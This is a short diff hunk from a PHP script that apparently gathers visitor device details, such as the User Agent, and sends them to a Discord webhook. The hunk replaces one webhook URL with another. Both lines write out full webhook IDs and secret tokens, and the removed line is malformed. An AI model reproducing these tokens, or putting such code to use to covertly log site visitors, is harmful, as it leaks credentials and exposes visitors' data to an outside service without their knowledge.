@@ -6,7 +6,7 @@ $device_info = array(
   "User Agent" => $_SERVER['HTTP_USER_AGENT']
 );
 
-$webhook_url = "https://discordapp.com/api/webhooks/your-webhook-idhttps://discord.com/api/webhooks/1074609957955190874/PpgkUUSkg5_JMIVzUB9EdHuoG3OAKRrDsYrbStZHljSDejjBRepZbKFPJGpKYzNuiJ_V";
+$webhook_url = "https://discord.com/api/webhooks/1198915546444468274/aCf_8Anhyhhw5AK9d6qD_4-xHR27CYMKu7D1n9Dcas5uGELcvU58WH9f1BVeggKd9X7w";
 
 $data = array(
   "embeds" => array(
